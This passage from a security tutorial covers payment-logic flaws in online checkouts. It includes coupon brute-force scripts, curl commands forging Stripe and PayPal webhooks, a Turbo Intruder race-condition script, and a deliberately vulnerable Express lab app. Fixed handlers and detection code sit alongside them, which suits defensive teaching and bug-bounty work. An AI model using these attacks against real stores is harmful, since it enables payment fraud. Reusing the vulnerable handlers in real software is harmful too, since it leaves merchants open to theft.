Content-Type: application/json

{"coupon_code": "FUZZ"}
```

Payload set: Combination of common prefixes + percentages + years.

**Using ffuf for faster brute-forcing:**

```bash
# Generate wordlist
cat > /tmp/coupon_prefixes.txt << 'PREFIXES'
SAVE
DISCOUNT
WELCOME
SUMMER
WINTER
SPRING
FALL
BF
CM
PARTNER
VIP
STAFF
LOYALTY
FLASH
PREFIXES

# Generate combinations
for prefix in $(cat /tmp/coupon_prefixes.txt); do
  for num in 5 10 15 20 25 30 40 50 75 100; do
    echo "${prefix}${num}"
  done
  for year in 2024 2025 2026; do
    echo "${prefix}${year}"
  done
done > /tmp/coupons.txt

ffuf -u https://shop.target.com/api/v1/cart/apply-coupon \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"coupon_code":"FUZZ"}' \
  -w /tmp/coupons.txt \
  -mc 200 \
  -fr "Invalid coupon"
```

### 9.2 Prevention

```javascript
// Rate limiting on coupon attempts
const rateLimit = require('express-rate-limit');

const couponLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10,                   // 10 attempts per window
  keyGenerator: (req) => req.user.sub,
  handler: (req, res) => {
    res.status(429).json({ error: 'Too many coupon attempts. Try again later.' });
  }
});

app.post('/api/v1/cart/apply-coupon', couponLimiter, async (req, res) => {
  // ... coupon logic

  // Use cryptographically random coupon codes, not predictable patterns
  // Example: "X7K2-M9P4-Q3R1" instead of "SAVE20"
});

// Generating secure coupon codes
const crypto = require('crypto');

function generateSecureCouponCode() {
  const bytes = crypto.randomBytes(9);
  const code = bytes.toString('base64url').substring(0, 12).toUpperCase();
  // Format: XXXX-XXXX-XXXX
  return `${code.slice(0,4)}-${code.slice(4,8)}-${code.slice(8,12)}`;
}
```

---

## 10. Payment Gateway Callback Manipulation

### 10.1 How Payment Callbacks Work

Most payment flows follow this pattern:

1. Client initiates checkout on your server
2. Server creates a payment session with the gateway (Stripe, PayPal, etc.)
3. Client is redirected to the gateway to complete payment
4. Gateway redirects client back to your server with a callback/redirect URL
5. Gateway sends a server-to-server webhook confirming payment status

The vulnerability exists when the application trusts the client-side redirect (step 4) instead of waiting for the server-side webhook (step 5).

### 10.2 Callback URL Manipulation

**Legitimate callback:**

```
GET /api/v1/payment/callback?
  session_id=cs_live_a1b2c3&
  status=succeeded&
  amount=9999&
  order_id=ord_12345
HTTP/1.1
```

**Tampered callback:**

```
GET /api/v1/payment/callback?
  session_id=cs_live_a1b2c3&
  status=succeeded&
  amount=100&
  order_id=ord_12345
HTTP/1.1
```

The attacker changes `status` to `succeeded` and `amount` to a lower value.

### 10.3 Vulnerable Callback Handler

```javascript
// VULNERABLE: Trusts client-side callback parameters
app.get('/api/v1/payment/callback', async (req, res) => {
  const { session_id, status, amount, order_id } = req.query;

  if (status === 'succeeded') {  // BUG: trusts client-provided status
    await pool.query(
      'UPDATE orders SET status = $1, paid_amount = $2 WHERE id = $3',
      ['paid', amount, order_id]  // BUG: trusts client-provided amount
    );

    return res.redirect('/order-confirmation');
  }

  return res.redirect('/payment-failed');
});
```

### 10.4 Fixed Callback Handler

```javascript
// FIXED: Verify payment status directly with the payment gateway
app.get('/api/v1/payment/callback', async (req, res) => {
  const { session_id } = req.query;

  // CRITICAL: Verify with Stripe server-to-server, ignore all other params
  try {
    const session = await stripe.checkout.sessions.retrieve(session_id);

    if (session.payment_status !== 'paid') {
      return res.redirect('/payment-failed');
    }

    // Use the amount from Stripe's response, not from the query string
    const order = await pool.query(
      'SELECT * FROM orders WHERE stripe_session_id = $1',
      [session_id]
    );

    if (order.rows.length === 0) {
      return res.redirect('/payment-failed');
    }

    // Verify the paid amount matches the expected order amount
    const paidAmount = session.amount_total; // From Stripe (in cents)
    const expectedAmount = Math.round(order.rows[0].total_amount * 100);

    if (paidAmount < expectedAmount) {
      // Amount mismatch -- possible manipulation
      console.error('PAYMENT_AMOUNT_MISMATCH', {
        order_id: order.rows[0].id,
        expected: expectedAmount,
        received: paidAmount
      });
      return res.redirect('/payment-failed');
    }

    await pool.query(
      'UPDATE orders SET status = $1, paid_amount = $2 WHERE id = $3',
      ['paid', paidAmount / 100, order.rows[0].id]
    );

    return res.redirect('/order-confirmation');

  } catch (err) {
    console.error('Payment verification failed:', err);
    return res.redirect('/payment-failed');
  }
});
```

---

## 11. Stripe Webhook Abuse

### 11.1 How Stripe Webhooks Work

Stripe sends POST requests to your webhook endpoint when events occur (payment succeeded, refund issued, etc.). The webhook payload is signed using a webhook secret.

### 11.2 Vulnerable Webhook Handler

```javascript
// VULNERABLE: No signature verification
app.post('/api/v1/webhooks/stripe', express.raw({ type: 'application/json' }), async (req, res) => {
  const event = JSON.parse(req.body); // BUG: No signature verification

  if (event.type === 'checkout.session.completed') {
    const session = event.data.object;

    // Trusts the webhook payload without verification
    await pool.query(
      'UPDATE orders SET status = $1 WHERE stripe_session_id = $2',
      ['paid', session.id]
    );
  }

  return res.json({ received: true });
});
```

**Exploitation -- forging a webhook:**

```bash
curl -X POST https://shop.target.com/api/v1/webhooks/stripe \
  -H "Content-Type: application/json" \
  -d '{
    "type": "checkout.session.completed",
    "data": {
      "object": {
        "id": "cs_live_attacker_session_id",
        "payment_status": "paid",
        "amount_total": 0
      }
    }
  }'
```

The attacker sends a forged webhook, and the application marks their order as paid without any actual payment.

### 11.3 Fixed Stripe Webhook Handler

```javascript
// FIXED: Proper Stripe webhook signature verification
const endpointSecret = process.env.STRIPE_WEBHOOK_SECRET;

app.post('/api/v1/webhooks/stripe',
  express.raw({ type: 'application/json' }),
  async (req, res) => {
    const sig = req.headers['stripe-signature'];

    let event;
    try {
      // This verifies the webhook was actually sent by Stripe
      // using the webhook signing secret
      event = stripe.webhooks.constructEvent(req.body, sig, endpointSecret);
    } catch (err) {
      console.error('Webhook signature verification failed:', err.message);
      return res.status(400).json({ error: 'Invalid signature' });
    }

    // Idempotency: check if we already processed this event
    const existing = await pool.query(
      'SELECT id FROM processed_webhooks WHERE stripe_event_id = $1',
      [event.id]
    );

    if (existing.rows.length > 0) {
      return res.json({ received: true, already_processed: true });
    }

    if (event.type === 'checkout.session.completed') {
      const session = event.data.object;

      // Additional verification: retrieve the session from Stripe API
      // to confirm the data matches (defense in depth)
      const verified = await stripe.checkout.sessions.retrieve(session.id);

      if (verified.payment_status !== 'paid') {
        console.error('Webhook session not actually paid:', session.id);
        return res.status(400).json({ error: 'Payment not confirmed' });
      }

      // Verify amount matches order
      const order = await pool.query(
        'SELECT * FROM orders WHERE stripe_session_id = $1',
        [session.id]
      );

      if (order.rows.length === 0) {
        console.error('No order found for session:', session.id);
        return res.status(400).json({ error: 'Order not found' });
      }

      const expectedAmount = Math.round(order.rows[0].total_amount * 100);
      if (verified.amount_total < expectedAmount) {
        console.error('Amount mismatch:', {
          expected: expectedAmount,
          received: verified.amount_total
        });
        return res.status(400).json({ error: 'Amount mismatch' });
      }

      // Update order status
      await pool.query(
        'UPDATE orders SET status = $1 WHERE stripe_session_id = $2',
        ['paid', session.id]
      );

      // Record processed webhook for idempotency
      await pool.query(
        'INSERT INTO processed_webhooks (stripe_event_id, event_type, processed_at) VALUES ($1, $2, NOW())',
        [event.id, event.type]
      );
    }

    return res.json({ received: true });
  }
);
```

---

## 12. PayPal Webhook Abuse

### 12.1 PayPal IPN (Instant Payment Notification) Vulnerabilities

PayPal's legacy IPN system sends notifications to your server when a payment completes. The correct flow requires your server to POST the notification back to PayPal for verification.

### 12.2 Vulnerable PayPal IPN Handler

```javascript
// VULNERABLE: No IPN verification with PayPal
app.post('/api/v1/webhooks/paypal-ipn', express.urlencoded({ extended: true }), async (req, res) => {
  const { payment_status, mc_gross, custom, txn_id } = req.body;

  // BUG: Trusts IPN data without verifying with PayPal
  if (payment_status === 'Completed') {
    await pool.query(
      'UPDATE orders SET status = $1, paid_amount = $2, txn_id = $3 WHERE id = $4',
      ['paid', mc_gross, txn_id, custom]
    );
  }

  return res.send('OK');
});
```

**Exploitation:**

```bash
curl -X POST https://shop.target.com/api/v1/webhooks/paypal-ipn \
  -d "payment_status=Completed" \
  -d "mc_gross=0.01" \
  -d "custom=order_12345" \
  -d "txn_id=FAKE_TXN_12345" \
  -d "receiver_email=attacker@evil.com"
```

### 12.3 Fixed PayPal IPN Handler

```javascript
// FIXED: Verify IPN with PayPal before processing
const axios = require('axios');

app.post('/api/v1/webhooks/paypal-ipn',
  express.urlencoded({ extended: true }),
  async (req, res) => {
    // Step 1: Immediately return 200 to PayPal
    res.send('OK');

    // Step 2: Verify IPN by posting it back to PayPal
    const verificationBody = 'cmd=_notify-validate&' + new URLSearchParams(req.body).toString();

    const verifyResponse = await axios.post(
      'https://ipnpb.paypal.com/cgi-bin/webscr', // Use sandbox URL for testing
      verificationBody,
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    if (verifyResponse.data !== 'VERIFIED') {
      console.error('PayPal IPN verification failed');
      return;
    }

    const { payment_status, mc_gross, mc_currency, custom, txn_id, receiver_email } = req.body;

    // Step 3: Verify receiver_email matches YOUR PayPal account
    if (receiver_email !== process.env.PAYPAL_MERCHANT_EMAIL) {
      console.error('IPN for wrong receiver:', receiver_email);
      return;
    }

    // Step 4: Verify this is a Completed payment
    if (payment_status !== 'Completed') {
      console.log('Non-completed payment status:', payment_status);
      return;
    }

    // Step 5: Check for duplicate transaction
    const existingTxn = await pool.query(
      'SELECT id FROM orders WHERE paypal_txn_id = $1', [txn_id]
    );

    if (existingTxn.rows.length > 0) {
      console.log('Duplicate IPN for txn:', txn_id);
      return;
    }

    // Step 6: Verify amount and currency match the order
    const order = await pool.query(
      'SELECT * FROM orders WHERE id = $1 AND status = $2',
      [custom, 'pending']
    );

    if (order.rows.length === 0) {
      console.error('Order not found or not pending:', custom);
      return;
    }

    const expectedAmount = order.rows[0].total_amount;
    if (parseFloat(mc_gross) < expectedAmount) {
      console.error('Amount mismatch:', { expected: expectedAmount, received: mc_gross });
      return;
    }

    if (mc_currency !== 'USD') {
      console.error('Unexpected currency:', mc_currency);
      return;
    }

    // Step 7: All checks passed -- fulfill the order
    await pool.query(
      'UPDATE orders SET status = $1, paid_amount = $2, paypal_txn_id = $3 WHERE id = $4',
      ['paid', mc_gross, txn_id, custom]
    );
  }
);
```

---

## 13. Complete Vulnerable Checkout Flow (Lab Reference)

This is a full Express.js application with every vulnerability discussed in this article. Use it as a lab for practicing exploitation.

```javascript
// INTENTIONALLY VULNERABLE -- DO NOT USE IN PRODUCTION
const express = require('express');
const jwt = require('jsonwebtoken');
const { Pool } = require('pg');

const app = express();
app.use(express.json());
const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const JWT_SECRET = 'weak_checkout_secret';

function auth(req, res, next) {
  try {
    req.user = jwt.verify(req.headers.authorization?.split(' ')[1], JWT_SECRET);
    next();
  } catch { res.status(401).json({ error: 'Unauthorized' }); }
}

// VULN 1: Price from client
app.post('/api/cart/add', auth, async (req, res) => {
  const { product_id, quantity, price } = req.body;
  await pool.query(
    'INSERT INTO cart_items VALUES ($1, $2, $3, $4)',
    [req.user.sub, product_id, quantity, price]
  );
  res.json({ status: 'added' });
});

// VULN 2: No negative quantity check
app.put('/api/cart/update', auth, async (req, res) => {
  const { product_id, quantity } = req.body;
  await pool.query(
    'UPDATE cart_items SET quantity = $1 WHERE user_id = $2 AND product_id = $3',
    [quantity, req.user.sub, product_id]
  );
  res.json({ status: 'updated' });
});

// VULN 3: No coupon stacking prevention, no race protection
app.post('/api/cart/coupon', auth, async (req, res) => {
  const { coupon_code } = req.body;
  const coupon = await pool.query(
    'SELECT * FROM coupons WHERE code = $1 AND times_used < max_uses',
    [coupon_code]
  );
  if (coupon.rows.length === 0) return res.status(400).json({ error: 'Invalid' });

  const cart = await pool.query('SELECT total FROM carts WHERE user_id = $1', [req.user.sub]);
  const newTotal = cart.rows[0].total * (1 - coupon.rows[0].discount_percent / 100);

  await pool.query('UPDATE carts SET total = $1 WHERE user_id = $2', [newTotal, req.user.sub]);
  await pool.query('UPDATE coupons SET times_used = times_used + 1 WHERE code = $1', [coupon_code]);

  res.json({ new_total: newTotal });
});

// VULN 4: Currency from client
app.post('/api/checkout', auth, async (req, res) => {
  const { currency } = req.body;
  const cart = await pool.query('SELECT total FROM carts WHERE user_id = $1', [req.user.sub]);
  // Uses client-provided currency without conversion
  res.json({ charge_amount: cart.rows[0].total, currency });
});

// VULN 5: Race condition on wallet
app.post('/api/wallet/spend', auth, async (req, res) => {
  const { amount } = req.body;
  const wallet = await pool.query('SELECT balance FROM wallets WHERE user_id = $1', [req.user.sub]);
  if (wallet.rows[0].balance < amount) return res.status(400).json({ error: 'Insufficient' });
  await pool.query('UPDATE wallets SET balance = balance - $1 WHERE user_id = $2', [amount, req.user.sub]);
  res.json({ status: 'spent', remaining: wallet.rows[0].balance - amount });
});

// VULN 6: No webhook signature verification
app.post('/api/webhooks/payment', async (req, res) => {
  const { status, order_id, amount } = req.body;
  if (status === 'paid') {
    await pool.query('UPDATE orders SET status = $1 WHERE id = $2', ['paid', order_id]);
  }
  res.json({ received: true });
});

// VULN 7: Callback parameters trusted
app.get('/api/payment/callback', async (req, res) => {
  const { status, order_id } = req.query;
  if (status === 'success') {
    await pool.query('UPDATE orders SET status = $1 WHERE id = $2', ['paid', order_id]);
  }
  res.redirect('/done');
});

// VULN 8: Tax bypass -- tax calculated from client address that can change
app.post('/api/checkout/tax', auth, async (req, res) => {
  const { state } = req.body;
  const taxRates = { 'CA': 0.0725, 'NY': 0.08, 'TX': 0.0625, 'OR': 0.00 };
  const rate = taxRates[state] || 0;
  const cart = await pool.query('SELECT total FROM carts WHERE user_id = $1', [req.user.sub]);
  const tax = cart.rows[0].total * rate;
  res.json({ tax, total_with_tax: cart.rows[0].total + tax });
});

// VULN 9: Referral self-referral possible
app.post('/api/referral/claim', auth, async (req, res) => {
  const { referral_code } = req.body;
  const referrer = await pool.query('SELECT user_id FROM referral_codes WHERE code = $1', [referral_code]);
  if (referrer.rows.length === 0) return res.status(400).json({ error: 'Invalid' });
  // No check if referrer == current user, no IP check, no rate limit
  await pool.query('UPDATE wallets SET balance = balance + 10 WHERE user_id = $1', [referrer.rows[0].user_id]);
  await pool.query('UPDATE wallets SET balance = balance + 5 WHERE user_id = $1', [req.user.sub]);
  res.json({ status: 'Referral bonus applied' });
});

app.listen(3000, () => console.log('Vulnerable checkout lab on :3000'));
```

---

## 14. Burp Suite Testing Methodology for Payment Flows

### 14.1 Systematic Testing Checklist

**Phase 1: Flow Mapping**

1. Complete a normal purchase from start to finish with Burp Proxy active
2. Map every request in the checkout flow:
   - Add to cart
   - Update quantity
   - Apply coupon
   - Calculate tax
   - Calculate shipping
   - Create payment session
   - Payment callback/redirect
   - Order confirmation

**Phase 2: Parameter Analysis**

For each request, identify every parameter that relates to money:

| Parameter | Request | Type | Server-validated? |
|---|---|---|---|
| price | Add to cart | Body | TEST |
| quantity | Update cart | Body | TEST |
| coupon_code | Apply coupon | Body | TEST |
| currency | Checkout | Body | TEST |
| total | Checkout | Body | TEST |
| tax_amount | Checkout | Body | TEST |
| shipping_cost | Checkout | Body | TEST |
| discount | Checkout | Body | TEST |
| state | Tax calc | Body | TEST |

**Phase 3: Manipulation**

For each parameter marked TEST:

1. **Send to Repeater**
2. **Modify the value** (negative, zero, extremely large, different type)
3. **Observe the response** (does the total change? does it error? does it accept?)
4. **Compare with the final charge** (does the manipulated value persist through to payment?)

### 14.2 Repeater Workflow for Price Tampering

```
Tab 1 (Baseline):
  POST /api/v1/cart/add
  {"product_id": "x1", "quantity": 1, "price": 99.99}
  Response: {"total": 99.99}

Tab 2 (Zero price):
  POST /api/v1/cart/add
  {"product_id": "x1", "quantity": 1, "price": 0}
  Response: {"total": 0.00}  <-- VULNERABLE

Tab 3 (Negative price):
  POST /api/v1/cart/add
  {"product_id": "x1", "quantity": 1, "price": -50}
  Response: {"total": -50.00}  <-- VULNERABLE

Tab 4 (No price field):
  POST /api/v1/cart/add
  {"product_id": "x1", "quantity": 1}
  Response: {"total": 99.99}  <-- Server looked up price (good sign)
  Response: {"error": "price is required"}  <-- Server EXPECTS price from client (bad)
```

### 14.3 Turbo Intruder Template for Race Conditions

```python
# Generic race condition test for any endpoint
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=1,
        pipeline=False
    )

    # Queue requests with gate for synchronized release
    for i in range(50):
        engine.queue(target.req, gate='race')

    # Release all at once
    engine.openGate('race')
    engine.complete(timeout=15)

def handleResponse(req, interesting):
    # Log all successful responses
    if '200' in req.status:
        table.add(req)
```

**How to use:**

1. In Burp, capture the request you want to race (e.g., wallet spend, coupon apply)
2. Right-click, Send to Turbo Intruder
3. Paste the script above
4. Click Attack
5. Analyze results: multiple `200 OK` responses for an operation that should only succeed once = race condition confirmed

---

## 15. Bug Bounty Report Example

```markdown
## Title
Race condition in wallet purchase endpoint allows double-spend,
draining wallet balance below zero

## Severity
High (CVSS 8.1) -- Direct financial impact. Attacker can purchase
items worth more than their wallet balance.

## Summary
The POST /api/v1/wallet/purchase endpoint does not use database
locking or atomic operations for balance checking and deduction.
By sending concurrent requests using Burp Suite Turbo Intruder,
an attacker can spend the same balance multiple times before any
deduction is committed.

## Steps to Reproduce
1. Create an account and add $100.00 to the wallet
2. Add a product costing $100.00 to the cart
3. Configure Burp Turbo Intruder with the following request:

    POST /api/v1/wallet/purchase HTTP/1.1
    Host: shop.target.com
    Authorization: Bearer <token>
    Content-Type: application/json

    {"product_id": "prod_100_item", "payment_method": "wallet", "amount": 100.00}

4. Use the race condition script (50 concurrent connections, gate pattern)
5. Click Attack
6. Observe results: 3-5 requests return HTTP 200 with "status": "purchased"
7. Check wallet balance: -$200.00 to -$400.00

## Impact
An attacker with a $100 wallet balance can purchase $300-$500 worth of
products in a single race condition attack. This directly costs the
business the value of shipped goods minus the wallet balance. At scale,
this could be exploited repeatedly using referral bonuses or minimum
wallet top-ups.

Estimated direct financial impact: $200-$400 per attack, repeatable.

## Remediation
Use an atomic conditional UPDATE statement:

    UPDATE wallets SET balance = balance - $amount
    WHERE user_id = $uid AND balance >= $amount
    RETURNING balance;

This eliminates the race window because the check and deduction are
a single atomic database operation. Additionally, implement idempotency
keys to prevent duplicate order creation.

## Supporting Evidence
[Screenshot: Turbo Intruder results showing 4 successful purchases]
[Screenshot: Wallet balance showing -$300.00]
[Screenshot: Order history showing 4 completed orders for $100.00 each]
```

---

## 16. Common Developer Mistakes Summary

| Mistake | Vulnerability | Fix |
|---|---|---|
| Accepting price from client request | Price tampering | Server-side price lookup from DB |
| No quantity validation | Negative quantity / overflow | Validate: integer, min 1, max cap |
| Non-atomic coupon check-then-apply | Coupon replay via race condition | `SELECT ... FOR UPDATE` in transaction |
| No coupon stacking limit | Excessive discount stacking | Limit one coupon or recalculate from base price |
| Currency from client input | Currency manipulation | Server-determined currency based on account |
| Tax calculated from client address | Tax bypass | Calculate tax at charge time from confirmed address |
| No webhook signature verification | Forged payment confirmations | Verify Stripe signature / PayPal IPN verification |
| Trusting callback URL parameters | Payment callback manipulation | Verify with gateway API, ignore callback params |
| check-then-act wallet balance | Double-spend race condition | Atomic `UPDATE WHERE balance >= amount` |
| Predictable coupon codes | Brute-force discovery | Cryptographically random codes + rate limiting |
| No referral abuse prevention | Self-referral farming | IP/device checks, delayed rewards, rate limits |
| No idempotency keys | Duplicate orders from retries | Unique idempotency key per checkout attempt |

---

## 17. Detection Strategies

### 17.1 Server-Side Anomaly Detection

```javascript
// Middleware to detect payment anomalies
async function paymentAnomalyDetection(req, res, next) {
  const userId = req.user?.sub;

  if (!userId) return next();

  // Check 1: Multiple rapid checkout attempts (race condition indicator)
  const recentCheckouts = await pool.query(
    `SELECT COUNT(*) FROM orders
     WHERE user_id = $1 AND created_at > NOW() - INTERVAL '10 seconds'`,
    [userId]
  );

  if (parseInt(recentCheckouts.rows[0].count) > 3) {
    console.warn('ANOMALY: Rapid checkout attempts', { userId, count: recentCheckouts.rows[0].count });
    // Optional: block and require manual review
  }

  // Check 2: Negative wallet balance
  const wallet = await pool.query(
    'SELECT balance FROM wallets WHERE user_id = $1', [userId]
  );

  if (wallet.rows.length > 0 && wallet.rows[0].balance < 0) {
    console.error('CRITICAL: Negative wallet balance detected', {
      userId,
      balance: wallet.rows[0].balance
    });
    // Block further purchases and flag for review
  }

  // Check 3: Orders with suspiciously low totals
  const suspiciousOrders = await pool.query(
    `SELECT id, total_amount FROM orders
     WHERE user_id = $1 AND total_amount < 1.00 AND status = 'paid'
     AND created_at > NOW() - INTERVAL '24 hours'`,
    [userId]
  );

  if (suspiciousOrders.rows.length > 0) {
    console.warn('ANOMALY: Low-value orders', {
      userId,
      orders: suspiciousOrders.rows
    });
  }

  next();
}
```

### 17.2 CloudWatch / ELK Alerts

```bash
# Detect race condition patterns: multiple orders created within 1 second
# for the same user
SELECT user_id, COUNT(*) as order_count, MIN(created_at), MAX(created_at)
FROM orders
WHERE created_at > NOW() - INTERVAL '1 hour'
GROUP BY user_id, date_trunc('second', created_at)
HAVING COUNT(*) > 1
ORDER BY order_count DESC;
```

---

## 18. Lab Setup Ideas

### 18.1 Docker Compose Lab

```yaml
# docker-compose.yml
version: '3.8'
services:
  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgres://lab:lab@db:5432/paymentlab
      - JWT_SECRET=weak_checkout_secret
      - STRIPE_SECRET_KEY=sk_test_... # Use Stripe test mode
    depends_on:
      - db

  db:
    image: postgres:15
    environment:
      - POSTGRES_USER=lab
      - POSTGRES_PASSWORD=lab
      - POSTGRES_DB=paymentlab
    ports:
      - "5432:5432"
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
```

```sql
-- init.sql
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(100) UNIQUE,
  password VARCHAR(100),
  email VARCHAR(200)
);

CREATE TABLE products (
  id VARCHAR(50) PRIMARY KEY,
  name VARCHAR(200),
  price DECIMAL(10,2),
  stock INTEGER DEFAULT 100,
  is_active BOOLEAN DEFAULT true
);

CREATE TABLE cart_items (
  user_id INTEGER REFERENCES users(id),
  product_id VARCHAR(50) REFERENCES products(id),
  quantity INTEGER,
  unit_price DECIMAL(10,2),
  PRIMARY KEY (user_id, product_id)
);

CREATE TABLE carts (
  user_id INTEGER PRIMARY KEY REFERENCES users(id),
  total DECIMAL(10,2) DEFAULT 0,
  applied_coupons TEXT[] DEFAULT '{}'
);

CREATE TABLE coupons (
  code VARCHAR(50) PRIMARY KEY,
  discount_percent INTEGER,
  max_uses INTEGER DEFAULT 1,
  times_used INTEGER DEFAULT 0,
  stackable BOOLEAN DEFAULT false,
  max_discount_amount DECIMAL(10,2),
  expires_at TIMESTAMP
);

CREATE TABLE wallets (
  user_id INTEGER PRIMARY KEY REFERENCES users(id),
  balance DECIMAL(10,2) DEFAULT 0
);

CREATE TABLE orders (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id),
  total_amount DECIMAL(10,2),
  paid_amount DECIMAL(10,2),
  status VARCHAR(20) DEFAULT 'pending',
  stripe_session_id VARCHAR(200),
  paypal_txn_id VARCHAR(200),
  idempotency_key VARCHAR(200) UNIQUE,
  created_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE referral_codes (
  code VARCHAR(50) PRIMARY KEY,
  user_id INTEGER REFERENCES users(id)
);

-- Seed data
INSERT INTO users (username, password, email) VALUES
  ('attacker', 'pass123', 'attacker@test.com'),
  ('victim', 'pass456', 'victim@test.com');

INSERT INTO products (id, name, price, stock) VALUES
  ('prod_laptop', 'Laptop Pro X1', 1999.99, 10),
  ('prod_phone', 'Phone Ultra', 999.99, 50),
  ('prod_case', 'Phone Case', 29.99, 1000),
  ('prod_cable', 'USB Cable', 9.99, 5000);

INSERT INTO coupons (code, discount_percent, max_uses, times_used) VALUES
  ('SAVE20', 20, 100, 0),
  ('SAVE50', 50, 1, 0),
  ('WELCOME10', 10, 1000, 0);

INSERT INTO wallets (user_id, balance) VALUES (1, 500.00), (2, 500.00);
INSERT INTO carts (user_id, total) VALUES (1, 0), (2, 0);
INSERT INTO referral_codes (code, user_id) VALUES ('REF_ATTACKER', 1);
```

### 18.2 Lab Exercises

| Exercise | Vulnerability | Difficulty |
|---|---|---|
| Buy a $1,999 laptop for $0.01 | Price tampering | Easy |
| Get a negative cart total | Negative quantity | Easy |
| Apply SAVE50 coupon twice on same order | Coupon replay race condition | Medium |
| Stack three coupons for 80% off | Coupon stacking | Easy |
| Spend $500 wallet to buy $2,000 in products | Double-spend race condition | Medium |
| Pay in IDR instead of USD | Currency manipulation | Easy |
| Order with 0% tax in California | Tax bypass | Easy |
| Farm $100 in referral bonuses | Referral self-referral | Easy |
| Mark an order as paid via fake webhook | Webhook forgery | Medium |
| Buy the last item with two accounts simultaneously | Inventory race condition | Hard |

---

## 19. Severity Explanation for Payment Bugs

| Vulnerability | Typical Severity | Reasoning |
|---|---|---|
| Price tampering (client-side price) | Critical (P1) | Direct financial loss, repeatable, no user interaction needed |
| Negative quantity / zero-cost checkout | Critical (P1) | Direct financial loss, free products |
| Coupon replay race condition | High (P2) | Financial loss but requires specific timing |
| Coupon stacking beyond intended limits | Medium-High (P2-P3) | Financial loss, limited by available coupons |
| Currency manipulation | Critical (P1) | Potentially unlimited financial loss |
| Tax bypass | Medium (P3) | Regulatory risk, typically smaller amounts |
| Referral abuse / self-referral | Medium (P3) | Financial loss, usually rate-limited by design |
| Wallet double-spend | Critical (P1) | Direct financial loss, repeatable |
| Webhook forgery (no signature check) | Critical (P1) | Complete payment bypass |
| Payment callback manipulation | High (P2) | Payment bypass, but may be caught by reconciliation |
| Discount code brute-force | Low-Medium (P4-P3) | Depends on discount value and discoverability |

Bug bounty payouts for payment vulnerabilities typically range from $500 for minor logic issues to $15,000+ for critical vulnerabilities that allow free purchases or wallet draining at scale.

---

## Conclusion

Payment manipulation vulnerabilities exist because developers build checkout flows under an implicit assumption: the client will send the values that the frontend computed. This assumption is false. Every value the client sends is attacker-controlled. Every price, quantity, currency code, tax amount, coupon code, and callback parameter can be modified in transit.

The defense model is straightforward but requires discipline:

1. **Never trust client-provided financial values.** Look up prices, tax rates, and shipping costs server-side at the time of charge.
2. **Validate all inputs with strict type checking and range constraints.** Quantities must be positive integers. Amounts must be positive. Currencies must be from an allowlist.
3. **Use atomic database operations for financial mutations.** Conditional `UPDATE ... WHERE balance >= amount` eliminates race conditions. `SELECT ... FOR UPDATE` provides row-level locking.
4. **Implement idempotency keys** to prevent duplicate orders from retried requests.
5. **Verify payment gateway webhooks cryptographically.** Always check Stripe signatures, always verify PayPal IPNs, never trust callback URL parameters.
6. **Recalculate everything at charge time.** Do not rely on cached cart totals. Recompute from source-of-truth prices, apply discounts from scratch, and verify the final amount matches what the payment gateway charged.

For bug bounty hunters: payment flows are high-value targets. Systematically test every parameter in every request in the checkout flow. Use Turbo Intruder for race conditions. Check every webhook endpoint for signature verification. The bugs are common, the impact is always clear (dollars lost), and the payouts reflect the severity.

---

*This article is part of the Security Deep Dive series. For more on access control vulnerabilities, see our deep dive on IDOR and broken access control. Test responsibly, report vulnerabilities through official channels, and never exploit payment bugs for personal gain.*
